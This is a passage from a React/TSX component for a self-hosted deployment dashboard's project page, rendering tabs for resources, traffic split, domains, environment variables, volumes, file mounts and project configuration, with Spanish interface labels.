                    {breaking.length > 0 && (
                      <div className="flex flex-wrap gap-1.5">
                        {breaking.slice(0, 6).map((ch, idx) => (
                          <span key={idx} className="px-2 py-0.5 rounded bg-red-50 border border-red-200 text-red-700 text-[10px] font-semibold">
                            {typeof ch === 'string' ? ch : `${ch.code || ch.rule || 'BREAKING'}${ch.path ? ` (${ch.path})` : ''}`}
                          </span>
                        ))}
                      </div>
                    )}
                    {contractResult.message && <div>{contractResult.message}</div>}
                  </div>
                );
              })()}
            </div>
          )}
        </section>
      )}

      <div className="pt-1">
        {activeTab === 'live' && (
          <LiveForgePanel projectId={project.id} projectName={project.name} onNotify={onNotify} />
        )}

        {activeTab === 'general' && (
          <div className="space-y-5">
            {!project.localRunning && !project.lastDeployedAt && (
              <div className="bg-white rounded-xl border border-slate-200 p-4 space-y-3">
                <div className="flex items-center justify-between gap-2">
                  <div>
                    <h2 className="text-sm font-semibold text-slate-900">{t('pd.ovStartTitle')}</h2>
                    <p className="text-xs text-slate-500 mt-0.5">{t('pd.ovStartDesc')}</p>
                  </div>
                  <HelpTip title="Local vs Docker vs Live Sync" align="right">
                    <p><strong>Local:</strong> {t('pd.ovStartLocalDesc')}</p>
                    <p><strong>Docker:</strong> {t('pd.ovStartDockerDesc')}</p>
                    <p><strong>Live Sync:</strong> {t('pd.ovStartLiveDesc')}</p>
                  </HelpTip>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-2.5">
                  <button
                    type="button"
                    onClick={handleStart}
                    disabled={loading}
                    className="p-3 rounded-lg border border-slate-200 bg-slate-50 hover:bg-slate-100 text-left transition-colors cursor-pointer disabled:opacity-50"
                  >
                    <div className="text-xs font-semibold text-slate-900 flex items-center gap-1.5">
                      <Play className="w-3.5 h-3.5 text-slate-700" /> {t('pd.ovStartLocal')}
                    </div>
                    <p className="text-[11px] text-slate-500 mt-1">{t('pd.ovStartLocalDesc')}</p>
                  </button>
                  <button
                    type="button"
                    onClick={() => setActiveTab('deployments')}
                    className="p-3 rounded-lg border border-slate-200 bg-slate-50 hover:bg-slate-100 text-left transition-colors cursor-pointer"
                  >
                    <div className="text-xs font-semibold text-slate-900 flex items-center gap-1.5">
                      <Rocket className="w-3.5 h-3.5 text-slate-700" /> {t('pd.ovStartDocker')}
                    </div>
                    <p className="text-[11px] text-slate-500 mt-1">{t('pd.ovStartDockerDesc')}</p>
                  </button>
                  <button
                    type="button"
                    onClick={() => setActiveTab('live')}
                    className="p-3 rounded-lg border border-slate-200 bg-slate-50 hover:bg-slate-100 text-left transition-colors cursor-pointer"
                  >
                    <div className="text-xs font-semibold text-slate-900 flex items-center gap-1.5">
                      <FolderOpen className="w-3.5 h-3.5 text-slate-700" /> {t('pd.ovStartLive')}
                    </div>
                    <p className="text-[11px] text-slate-500 mt-1">{t('pd.ovStartLiveDesc')}</p>
                  </button>
                </div>
              </div>
            )}

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
            <div className="lg:col-span-2 space-y-5">
              <div className="bg-white rounded-xl border border-slate-200 overflow-hidden">
                <div className="px-5 py-3.5 border-b border-slate-200 flex justify-between items-center bg-slate-50/70 gap-2 flex-wrap">
                  <h2 className="font-semibold text-sm text-slate-900 flex items-center gap-2">
                    <Box className="w-4 h-4 text-slate-600" />
                    {t('pd.ovResourcesTitle')}
                    <HelpTip title={t('pd.ovResourcesTitle')}>
                      <p><strong>{t('pd.ovDev')} (The Forge):</strong> {t('pd.ovDevEnvDesc')}</p>
                      <p><strong>{t('pd.ovProd')} (The Citadel):</strong> {t('pd.ovProdEnvDesc')}</p>
                    </HelpTip>
                  </h2>
                  <div className="flex items-center gap-2">
                    <button
                      type="button"
                      onClick={() => setActiveTab('databases')}
                      className="text-xs font-medium text-slate-700 hover:text-slate-900 bg-white border border-slate-200 px-2.5 py-1.5 rounded-lg flex items-center gap-1 cursor-pointer"
                    >
                      <Database className="w-3.5 h-3.5" /> {t('pd.ovAddDb')}
                    </button>
                    {onOpenCatalog && (
                      <button
                        type="button"
                        onClick={onOpenCatalog}
                        className="text-xs font-medium text-slate-700 hover:text-slate-900 bg-white border border-slate-200 px-2.5 py-1.5 rounded-lg flex items-center gap-1 cursor-pointer"
                      >
                        <Plus className="w-3.5 h-3.5" /> {t('pd.ovCatalog')}
                      </button>
                    )}
                  </div>
                </div>
                <div className="p-5 space-y-3">
                  {project.resources && project.resources.length > 0 ? (
                    project.resources.map((res: any) => {
                      const isResActive = project.status === 'active' && (project.localRunning || res.status === 'running' || res.status === 'active');
                      return (
                        <div key={res.id} className="flex items-center justify-between p-3.5 rounded-xl border border-slate-200 bg-white gap-3 flex-wrap">
                          <div className="flex items-center gap-3 min-w-0">
                            <div className="w-9 h-9 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-600 shrink-0">
                              {res.type === 'database' ? <Database className="w-4 h-4" /> : <Server className="w-4 h-4" />}
                            </div>
                            <div className="min-w-0">
                              <div className="text-sm font-medium text-slate-900 truncate">{res.name}</div>
                              <div className="text-xs text-slate-500">
                                {res.type} · <span className="font-mono">{res.image || t('pd.ovLocalProc')}</span>
                              </div>
                            </div>
                          </div>
                          <div className="flex items-center gap-3 text-xs">
                            {project.localRunning && res.localPort && (
                              <a
                                href={`http://${previewHost}:${res.localPort}`}
                                target="_blank"
                                rel="noreferrer"
                                className="inline-flex items-center gap-1 bg-slate-100 text-slate-700 hover:bg-slate-200 px-2.5 py-1 rounded-md font-mono"
                              >
                                <Globe className="w-3 h-3" /> :{res.localPort}
                              </a>
                            )}
                            <span className={`inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full font-medium border ${
                              isResActive
                                ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                                : 'bg-slate-100 text-slate-600 border-slate-200'
                            }`}>
                              <span className={`w-1.5 h-1.5 rounded-full ${isResActive ? 'bg-emerald-500' : 'bg-slate-400'}`} />
                              {isResActive ? t('pd.ovActive') : t('pd.ovStopped')}
                            </span>
                            <span className="text-slate-400 font-mono tabular-nums">
                              {Array.isArray(res.ports) ? res.ports.join(', ') : (res.ports || res.port || '—')}
                            </span>
                          </div>
                        </div>
                      );
                    })
                  ) : (
                    <>
                      <div className="flex items-center justify-between p-3.5 rounded-xl border border-slate-200 bg-white gap-3">
                        <div className="flex items-center gap-3">
                          <div className="w-9 h-9 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-600">
                            <Cpu className="w-4 h-4" />
                          </div>
                          <div>
                            <div className="text-sm font-medium text-slate-900">{t('pd.ovDevEnv')}</div>
                            <div className="text-xs text-slate-500">{t('pd.ovDevEnvDesc')}</div>
                          </div>
                        </div>
                        <div className="flex items-center gap-3 text-xs">
                          <span className={`inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full font-medium border ${
                            project.localRunning
                              ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                              : 'bg-slate-100 text-slate-600 border-slate-200'
                          }`}>
                            <span className={`w-1.5 h-1.5 rounded-full ${project.localRunning ? 'bg-emerald-500' : 'bg-slate-400'}`} />
                            {project.localRunning ? t('pd.ovRunning') : t('pd.ovStopped')}
                          </span>
                          <span className="text-slate-400 font-mono tabular-nums">:{project.localPort || project.forgePort}</span>
                        </div>
                      </div>

                      <div className="flex items-center justify-between p-3.5 rounded-xl border border-slate-200 bg-white gap-3">
                        <div className="flex items-center gap-3">
                          <div className="w-9 h-9 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-600">
                            <Server className="w-4 h-4" />
                          </div>
                          <div>
                            <div className="text-sm font-medium text-slate-900">{t('pd.ovProdEnv')}</div>
                            <div className="text-xs text-slate-500">{t('pd.ovProdEnvDesc')}</div>
                          </div>
                        </div>
                        <div className="flex items-center gap-3 text-xs">
                          <span className={`inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full font-medium border ${
                            project.lastDeployedAt && project.status === 'active'
                              ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                              : 'bg-slate-100 text-slate-600 border-slate-200'
                          }`}>
                            <span className={`w-1.5 h-1.5 rounded-full ${project.lastDeployedAt && project.status === 'active' ? 'bg-emerald-500' : 'bg-slate-400'}`} />
                            {project.lastDeployedAt
                              ? (project.status === 'active' ? t('pd.ovDeployed') : t('pd.ovStopped'))
                              : t('pd.ovNotDeployed')}
                          </span>
                          <span className="text-slate-400 font-mono tabular-nums">:{project.citadelPort}</span>
                        </div>
                      </div>
                    </>
                  )}
                </div>
              </div>
            </div>

            <div className="space-y-5">
              <div className="bg-white p-5 rounded-xl border border-slate-200 space-y-4">
                <h2 className="font-semibold text-sm text-slate-900 flex items-center gap-2">
                  <Activity className="w-4 h-4 text-slate-600" /> {t('pd.ovTrafficTitle')}
                </h2>
                <div className="space-y-3 text-xs">
                  <div>
                    <div className="flex justify-between mb-1.5">
                      <span className="text-slate-600">{t('pd.ovDev')}</span>
                      <span className="font-mono font-semibold text-slate-900 tabular-nums">{project.trafficSplit?.forge || 0}%</span>
                    </div>
                    <div className="w-full bg-slate-100 rounded-full h-2 overflow-hidden">
                      <div className="bg-slate-900 h-2 rounded-full" style={{ width: `${project.trafficSplit?.forge || 0}%` }} />
                    </div>
                  </div>
                  <div>
                    <div className="flex justify-between mb-1.5">
                      <span className="text-slate-600">{t('pd.ovProd')}</span>
                      <span className="font-mono font-semibold text-slate-900 tabular-nums">{project.trafficSplit?.citadel || 0}%</span>
                    </div>
                    <div className="w-full bg-slate-100 rounded-full h-2 overflow-hidden">
                      <div className="bg-emerald-500 h-2 rounded-full" style={{ width: `${project.trafficSplit?.citadel || 0}%` }} />
                    </div>
                  </div>
                </div>
                <div className="pt-3 border-t border-slate-100 space-y-2">
                  <button
                    type="button"
                    onClick={() => setActiveTab('deployments')}
                    className="w-full py-2 bg-slate-900 text-white rounded-lg text-xs font-medium hover:bg-slate-800 transition-colors cursor-pointer"
                  >
                    {t('pd.ovPublishProd')}
                  </button>
                  <button
                    type="button"
                    onClick={() => setActiveTab('live')}
                    className="w-full py-2 bg-white hover:bg-slate-50 text-slate-700 border border-slate-200 rounded-lg text-xs font-medium transition-colors cursor-pointer"
                  >
                    {t('pd.ovOpenLive')}
                  </button>
                </div>
              </div>

              <div className="bg-white p-5 rounded-xl border border-slate-200 space-y-3">
                <div className="flex items-center justify-between">
                  <h2 className="font-semibold text-sm text-slate-900 flex items-center gap-2">
                    <Globe className="w-4 h-4 text-slate-500" /> {t('pd.ovDomainsTitle')}
                  </h2>
                  <button
                    type="button"
                    onClick={() => setActiveTab('domains')}
                    className="text-xs font-medium text-slate-600 hover:text-slate-900 cursor-pointer"
                  >
                    {t('pd.ovManage')}
                  </button>
                </div>
                {project.domains && project.domains.length > 0 ? (
                  <div className="space-y-2">
                    {project.domains.map((d: string) => (
                      <div key={d} className="flex items-center justify-between p-2.5 bg-slate-50 border border-slate-200 rounded-lg gap-2">
                        <span className="text-xs font-mono text-slate-700 truncate">{d}</span>
                        <div className="flex items-center gap-1 shrink-0">
                          <button
                            type="button"
                            aria-label={`Copy ${d}`}
                            onClick={() => void copyValue(d)}
                            className="p-1 text-slate-400 hover:text-slate-700 rounded cursor-pointer"
                          >
                            <Copy className="w-3.5 h-3.5" />
                          </button>
                          <a
                            href={`https://${d}`}
                            target="_blank"
                            rel="noreferrer"
                            aria-label={`Open ${d}`}
                            className="p-1 text-slate-500 hover:text-slate-900 rounded"
                          >
                            <Globe className="w-3.5 h-3.5" />
                          </a>
                        </div>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="text-xs text-slate-500 p-4 bg-slate-50 border border-slate-200 rounded-lg text-center">
                    {t('pd.ovNoDomains')}
                  </div>
                )}
              </div>
            </div>
          </div>
          </div>
        )}

        {activeTab === 'deployments' && (
          <DeploymentsPanel
            projectId={project.id}
            projectName={project.name}
            gitBranch={project.gitBranch || 'main'}
            onNotify={onNotify}
          />
        )}

        {activeTab === 'logs' && (
          <div className="h-[620px]">
            <LiveLogs incomingLog={incomingLog} projectId={project.id} />
          </div>
        )}

        {activeTab === 'domains' && (
          <DomainManager
            onNotify={onNotify}
            projectId={project.id}
            projectDomains={project.domains || []}
            onDomainAddedToProject={() => { void fetchProject(); }}
            onDomainRemovedFromProject={() => { void fetchProject(); }}
          />
        )}

        {activeTab === 'databases' && (
          <DatabasesPanel
            projectId={project.id}
            linkedDatabaseIds={project.linkedDatabaseIds || []}
            onProjectChanged={() => { void fetchProject(); }}
            onOpenDeployments={() => setActiveTab('deployments')}
            onOpenBackupSettings={onOpenBackupSettings}
            onNotify={onNotify}
          />
        )}

        {activeTab === 'vars' && (
          <div className="culkibo-surface rounded-2xl overflow-hidden">
            <div className="p-5 border-b border-slate-200 flex flex-col md:flex-row md:items-center justify-between gap-4 bg-slate-50/70">
              <div>
                <h2 className="font-semibold text-slate-900 text-base flex items-center gap-2">
                  <Variable className="w-4 h-4 text-slate-600" /> {t('pd.envTitle')}
                  {envIsDirty && (
                    <span className="px-2 py-0.5 rounded-full bg-amber-50 border border-amber-200 text-amber-800 text-[11px] font-medium">
                      {t('pd.envDirty')}
                    </span>
                  )}
                </h2>
                <p className="text-xs text-slate-500 mt-0.5">{t('pd.envDesc')}</p>
              </div>
              <div className="flex items-center gap-2 flex-wrap">
                {project.lastDeployedAt && !envSavedPendingRestart && (
                  <button
                    type="button"
                    disabled={fastRestarting}
                    onClick={() => void handleFastRestart()}
                    className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-amber-200 bg-amber-50 hover:bg-amber-100 text-amber-900 text-xs font-medium cursor-pointer disabled:opacity-50"
                  >
                    {fastRestarting ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Zap className="w-3.5 h-3.5 text-amber-600" />}
                    <span>{fastRestarting ? t('pd.fastRestarting') : t('pd.fastRestartBtn')}</span>
                  </button>
                )}
                <div className="flex items-center bg-slate-200/70 p-0.5 rounded-lg">
                  <button
                    type="button"
                    onClick={() => switchEnvMode('table')}
                    className={`px-3 py-1.5 rounded-md text-xs font-medium transition-colors cursor-pointer ${
                      envMode === 'table' ? 'bg-white text-slate-900 shadow-2xs' : 'text-slate-600 hover:text-slate-900'
                    }`}
                  >
                    Tabla visual
                  </button>
                  <button
                    type="button"
                    onClick={() => switchEnvMode('raw')}
                    className={`px-3 py-1.5 rounded-md text-xs font-medium transition-colors cursor-pointer ${
                      envMode === 'raw' ? 'bg-white text-slate-900 shadow-2xs' : 'text-slate-600 hover:text-slate-900'
                    }`}
                  >
                    Archivo .env
                  </button>
                </div>
              </div>
            </div>

            {/* Runtime-Only Fast Restart Banner (curing dokploy#2547) */}
            {envSavedPendingRestart && (
              <div className="mx-5 mt-4 p-4 rounded-xl bg-amber-50/80 border border-amber-200 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs">
                <div className="flex items-start gap-2.5 min-w-0">
                  <Zap className="w-4 h-4 text-amber-600 shrink-0 mt-0.5" />
                  <div className="min-w-0">
                    <div className="font-semibold text-amber-950">{t('pd.fastBannerTitle')}</div>
                    <p className="text-amber-800/90 mt-0.5 leading-relaxed">{t('pd.fastBannerDesc')}</p>
                  </div>
                </div>
                <div className="flex items-center gap-2 shrink-0 flex-wrap">
                  <button
                    type="button"
                    disabled={fastRestarting}
                    onClick={() => void handleFastRestart()}
                    className="culkibo-press inline-flex items-center gap-1.5 px-3.5 py-2 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
                  >
                    {fastRestarting ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Zap className="w-3.5 h-3.5 text-amber-400" />}
                    <span>{fastRestarting ? t('pd.fastRestarting') : t('pd.fastRestartBtn')}</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setActiveTab('deployments')}
                    className="culkibo-press inline-flex items-center gap-1.5 px-3 py-2 rounded-lg bg-white hover:bg-slate-50 border border-slate-200 text-slate-700 font-medium cursor-pointer"
                  >
                    <Rocket className="w-3.5 h-3.5 text-slate-500" />
                    <span>{t('pd.fullDeployBtn')}</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setEnvSavedPendingRestart(false)}
                    aria-label="Dismiss banner"
                    className="p-1.5 rounded-lg text-amber-700/70 hover:text-amber-900 hover:bg-amber-100 cursor-pointer"
                  >
                    <X className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>
            )}

            {lastFastRestart && !envSavedPendingRestart && (
              <div className="mx-5 mt-4 px-4 py-2.5 rounded-xl bg-emerald-50 border border-emerald-200 text-emerald-900 text-xs flex items-center justify-between gap-2">
                <span className="inline-flex items-center gap-2 font-medium tabular-nums">
                  <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
                  <span>
                    {t('pd.fastRestartDone', {
                      ms:
                        lastFastRestart.durationMs !== null
                          ? lastFastRestart.durationMs >= 1000
                            ? `${(lastFastRestart.durationMs / 1000).toFixed(1)}s`
                            : `${Math.round(lastFastRestart.durationMs)}ms`
                          : '~1.5s',
                    })}
                  </span>
                </span>
                <button
                  type="button"
                  onClick={() => setLastFastRestart(null)}
                  aria-label="Dismiss"
                  className="p-1 rounded text-emerald-700 hover:bg-emerald-100 cursor-pointer"
                >
                  <X className="w-3.5 h-3.5" />
                </button>
              </div>
            )}

            <div className="p-5">
              {envMode === 'table' ? (
                <div className="space-y-4">
                  <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2.5">
                    <div className="relative flex-1">
                      <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
                      <input
                        type="text"
                        placeholder="Filtrar por nombre de variable…"
                        value={searchVar}
                        onChange={(e) => setSearchVar(e.target.value)}
                        className="w-full pl-9 pr-3 py-2 border border-slate-200 rounded-lg text-sm"
                      />
                    </div>
                    <button
                      type="button"
                      onClick={() => setEnvRows([{ key: '', value: '', id: `new_${Date.now()}` }, ...envRows])}
                      className="inline-flex items-center justify-center gap-1.5 bg-slate-900 hover:bg-slate-800 text-white px-3.5 py-2 rounded-lg text-xs font-medium cursor-pointer"
                    >
                      <Plus className="w-3.5 h-3.5" /> Añadir variable
                    </button>
                  </div>

                  <div className="border border-slate-200 rounded-xl overflow-hidden">
                    <div className="grid grid-cols-[1fr_1.8fr_auto] gap-3 bg-slate-50 px-3 py-2.5 border-b border-slate-200 text-xs font-medium text-slate-500">
                      <div>Clave</div>
                      <div>Valor</div>
                      <div className="w-20 text-center">Acciones</div>
                    </div>
                    <div className="divide-y divide-slate-100 max-h-[460px] overflow-y-auto">
                      {envRows.filter((r) => !searchVar || r.key.toLowerCase().includes(searchVar.toLowerCase())).length === 0 && (
                        <div className="p-8 text-center text-slate-500 text-xs">No hay variables que coincidan.</div>
                      )}
                      {envRows
                        .filter((r) => !searchVar || r.key.toLowerCase().includes(searchVar.toLowerCase()))
                        .map((row) => (
                          <div key={row.id} className="grid grid-cols-[1fr_1.8fr_auto] gap-3 p-2.5 items-center hover:bg-slate-50/70 group">
                            <input
                              type="text"
                              value={row.key}
                              onChange={(e) => {
                                setEnvRows((prev) => prev.map((r) => (r.id === row.id ? { ...r, key: e.target.value } : r)));
                              }}
                              placeholder="API_KEY"
                              className="w-full px-2.5 py-1.5 border border-transparent hover:border-slate-200 rounded-lg text-xs font-mono bg-transparent focus:bg-white"
                            />
                            <div className="relative flex items-center">
                              <input
                                type={showValues[row.id] ? 'text' : 'password'}
                                value={row.value}
                                onChange={(e) => {
                                  setEnvRows((prev) => prev.map((r) => (r.id === row.id ? { ...r, value: e.target.value } : r)));
                                }}
                                placeholder="valor"
                                className="w-full pl-2.5 pr-9 py-1.5 border border-transparent hover:border-slate-200 rounded-lg text-xs font-mono bg-transparent focus:bg-white"
                              />
                              <button
                                type="button"
                                aria-label={showValues[row.id] ? 'Ocultar valor' : 'Mostrar valor'}
                                onClick={() => setShowValues((prev) => ({ ...prev, [row.id]: !prev[row.id] }))}
                                className="absolute right-2 p-1 text-slate-400 hover:text-slate-700 rounded cursor-pointer"
                              >
                                {showValues[row.id] ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                              </button>
                            </div>
                            <div className="flex items-center justify-center gap-1 w-20 opacity-100 sm:opacity-0 sm:group-hover:opacity-100 sm:group-focus-within:opacity-100 transition-opacity">
                              <button
                                type="button"
                                aria-label="Copiar valor"
                                onClick={() => void copyValue(row.value)}
                                className="p-1.5 text-slate-400 hover:text-slate-900 hover:bg-slate-100 rounded cursor-pointer"
                                title="Copiar valor"
                              >
                                <Copy className="w-3.5 h-3.5" />
                              </button>
                              <button
                                type="button"
                                aria-label="Eliminar variable"
                                onClick={() => setEnvRows((prev) => prev.filter((r) => r.id !== row.id))}
                                className="p-1.5 text-slate-400 hover:text-red-600 hover:bg-red-50 rounded cursor-pointer"
                                title="Eliminar"
                              >
                                <Trash2 className="w-3.5 h-3.5" />
                              </button>
                            </div>
                          </div>
                        ))}
                    </div>
                  </div>
                  <div className="flex justify-end pt-2">
                    <button
                      type="button"
                      onClick={() => void handleSaveEnvTable()}
                      className="inline-flex items-center gap-1.5 bg-slate-900 hover:bg-slate-800 text-white px-4 py-2 rounded-lg text-xs font-medium cursor-pointer"
                    >
                      <Save className="w-3.5 h-3.5" /> Guardar variables
                    </button>
                  </div>
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="flex flex-wrap justify-between items-center gap-2 text-xs text-slate-500">
                    <p>
                      Pega líneas <code className="bg-slate-100 px-1 rounded text-slate-700 font-mono">CLAVE=valor</code>. Los comentarios con <code className="font-mono">#</code> se ignoran al guardar.
                    </p>
                    <div>
                      <input ref={envFileInputRef} type="file" accept=".env,.txt" onChange={handleImportEnvFile} className="hidden" />
                      <button
                        type="button"
                        onClick={() => envFileInputRef.current?.click()}
                        className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-slate-700 text-xs font-medium cursor-pointer"
                      >
                        <Upload className="w-3.5 h-3.5" /> Importar archivo .env
                      </button>
                    </div>
                  </div>
                  <textarea
                    value={envText}
                    onChange={(e) => setEnvText(e.target.value)}
                    className="w-full h-[360px] p-3.5 bg-slate-50 text-slate-900 border border-slate-200 rounded-xl font-mono text-xs leading-relaxed resize-y"
                    placeholder={'PORT=3000\nDATABASE_URL=postgres://user:pass@host:5432/db'}
                    spellCheck={false}
                  />
                  <div className="flex justify-end">
                    <button
                      type="button"
                      onClick={() => void handleSaveEnvRaw()}
                      className="inline-flex items-center gap-1.5 bg-slate-900 hover:bg-slate-800 text-white px-4 py-2 rounded-lg text-xs font-medium cursor-pointer"
                    >
                      <CheckCircle2 className="w-3.5 h-3.5" /> Guardar variables
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {activeTab === 'storage' && (
          <div className="space-y-5">
            <div className="bg-white p-5 rounded-xl border border-slate-200 space-y-4">
              <div className="flex justify-between items-center">
                <h2 className="font-semibold text-slate-900 flex items-center gap-2 text-base">
                  <Database className="w-4 h-4 text-slate-600" /> Volúmenes persistentes
                </h2>
                <button
                  type="button"
                  onClick={() => setShowVolumeForm((prev) => !prev)}
                  className="text-xs font-medium text-slate-700 hover:text-slate-900 bg-white border border-slate-200 px-3 py-1.5 rounded-lg flex items-center gap-1 cursor-pointer"
                >
                  <Plus className="w-3.5 h-3.5" /> {showVolumeForm ? 'Cerrar' : 'Añadir volumen'}
                </button>
              </div>

              {showVolumeForm && (
                <form onSubmit={handleAddVolume} className="p-3.5 rounded-xl bg-slate-50 border border-slate-200 grid grid-cols-1 sm:grid-cols-3 gap-2.5 text-xs">
                  <input required value={volForm.name} onChange={(e) => setVolForm({ ...volForm, name: e.target.value })} placeholder="Nombre (ej. uploads)" className="px-3 py-2 bg-white border border-slate-200 rounded-lg" />
                  <input required value={volForm.mount_path} onChange={(e) => setVolForm({ ...volForm, mount_path: e.target.value })} placeholder="Ruta contenedor (/data)" className="px-3 py-2 bg-white border border-slate-200 rounded-lg font-mono" />
                  <div className="flex gap-2">
                    <input value={volForm.host_path} onChange={(e) => setVolForm({ ...volForm, host_path: e.target.value })} placeholder="Ruta host (opcional)" className="flex-1 px-3 py-2 bg-white border border-slate-200 rounded-lg font-mono" />
                    <button type="submit" className="px-3 py-2 rounded-lg bg-slate-900 text-white font-medium cursor-pointer">Guardar</button>
                  </div>
                </form>
              )}

              <div className="border border-slate-200 rounded-xl overflow-x-auto">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="bg-slate-50 border-b border-slate-200 text-xs font-medium text-slate-500">
                      <th className="py-2.5 px-4">Nombre</th>
                      <th className="py-2.5 px-4">Ruta contenedor</th>
                      <th className="py-2.5 px-4">Ruta host</th>
                      <th className="py-2.5 px-4 w-12" />
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 text-xs">
                    {(!project.volumes || project.volumes.length === 0) ? (
                      <tr><td colSpan={4} className="p-6 text-center text-slate-500">No hay volúmenes configurados.</td></tr>
                    ) : (
                      project.volumes.map((vol, i) => (
                        <tr key={i}>
                          <td className="py-2.5 px-4 font-medium text-slate-700">{vol.name || `Volumen ${i + 1}`}</td>
                          <td className="py-2.5 px-4 font-mono text-slate-500">{vol.mount_path || vol.mountPath || '/data'}</td>
                          <td className="py-2.5 px-4 font-mono text-slate-500">{vol.host_path || vol.hostPath || '—'}</td>
                          <td className="py-2.5 px-4 text-right">
                            <button type="button" aria-label="Eliminar volumen" onClick={() => void handleRemoveVolume(i)} className="p-1 text-slate-400 hover:text-red-600 cursor-pointer">
                              <Trash2 className="w-3.5 h-3.5" />
                            </button>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            <div className="bg-white p-5 rounded-xl border border-slate-200 space-y-4">
              <div className="flex justify-between items-center">
                <h2 className="font-semibold text-slate-900 flex items-center gap-2 text-base">
                  <Box className="w-4 h-4 text-slate-600" /> Archivos montados
                </h2>
                <button
                  type="button"
                  onClick={() => setShowMountForm((prev) => !prev)}
                  className="text-xs font-medium text-slate-700 hover:text-slate-900 bg-white border border-slate-200 px-3 py-1.5 rounded-lg flex items-center gap-1 cursor-pointer"
                >
                  <Plus className="w-3.5 h-3.5" /> {showMountForm ? 'Cerrar' : 'Montar archivo'}
                </button>
              </div>

              {showMountForm && (
                <form onSubmit={handleAddFileMount} className="p-3.5 rounded-xl bg-slate-50 border border-slate-200 space-y-3 text-xs">
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                    <input required value={mountForm.mount_path} onChange={(e) => setMountForm({ ...mountForm, mount_path: e.target.value })} placeholder="Ruta de montaje (/etc/app/config.json)" className="sm:col-span-2 px-3 py-2 bg-white border border-slate-200 rounded-lg font-mono" />
                    <input value={mountForm.chmod} onChange={(e) => setMountForm({ ...mountForm, chmod: e.target.value })} placeholder="Permisos (644)" className="px-3 py-2 bg-white border border-slate-200 rounded-lg font-mono" />
                  </div>
                  <textarea value={mountForm.content} onChange={(e) => setMountForm({ ...mountForm, content: e.target.value })} rows={3} placeholder="Contenido del archivo (opcional)" className="w-full p-2.5 bg-white border border-slate-200 rounded-lg font-mono" />
                  <div className="flex justify-end">
                    <button type="submit" className="px-3.5 py-2 rounded-lg bg-slate-900 text-white font-medium cursor-pointer">Guardar archivo</button>
                  </div>
                </form>
              )}

              <div className="border border-slate-200 rounded-xl overflow-x-auto">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="bg-slate-50 border-b border-slate-200 text-xs font-medium text-slate-500">
                      <th className="py-2.5 px-4">Ruta de montaje</th>
                      <th className="py-2.5 px-4">Permisos</th>
                      <th className="py-2.5 px-4 w-12" />
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 text-xs">
                    {(!project.fileMounts || project.fileMounts.length === 0) ? (
                      <tr><td colSpan={3} className="p-6 text-center text-slate-500">No hay archivos montados.</td></tr>
                    ) : (
                      project.fileMounts.map((fm, i) => (
                        <tr key={i}>
                          <td className="py-2.5 px-4 font-mono text-slate-700">{fm.mountPath || fm.mount_path || '/etc/config.json'}</td>
                          <td className="py-2.5 px-4 font-mono text-slate-500">chmod {fm.chmod || '644'}</td>
                          <td className="py-2.5 px-4 text-right">
                            <button type="button" aria-label="Eliminar archivo montado" onClick={() => void handleRemoveFileMount(i)} className="p-1 text-slate-400 hover:text-red-600 cursor-pointer">
                              <Trash2 className="w-3.5 h-3.5" />
                            </button>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'config' && (
          <div className="space-y-5">
            <div className="bg-white p-5 rounded-xl border border-slate-200 space-y-4">
              <div className="flex items-center justify-between gap-2">
                <h2 className="font-semibold text-slate-900 flex items-center gap-2 text-base">
                  <Settings className="w-4 h-4 text-slate-600" /> Configuración del proyecto
                </h2>
                {configDirty && (
                  <span className="px-2 py-0.5 rounded-full bg-amber-50 border border-amber-200 text-amber-800 text-[11px] font-medium">
                    Cambios sin guardar
                  </span>
                )}
              </div>
              <form
                key={project.id}
                onChange={() => setConfigDirty(true)}
                onSubmit={async (e) => {
                  e.preventDefault();
                  const formData = new FormData(e.currentTarget);
                  const wp = (formData.get('watchPaths') as string) || '';
                  const memRaw = Number(formData.get('memoryMb'));
                  const cpuRaw = String(formData.get('cpus') || '').trim();
                  const localPathVal = String(formData.get('localPath') || '').trim();
                  const preDeployVal = String(formData.get('preDeployCommand') || '').trim();
                  const postDeployVal = String(formData.get('postDeployCommand') || '').trim();
                  const updates = {
                    name: formData.get('name'),
                    description: formData.get('description'),
                    gitRepo: formData.get('gitRepo'),
                    gitBranch: formData.get('gitBranch'),
                    localPath: localPathVal || null,
                    buildCommand: formData.get('buildCommand'),
                    startCommand: formData.get('startCommand'),
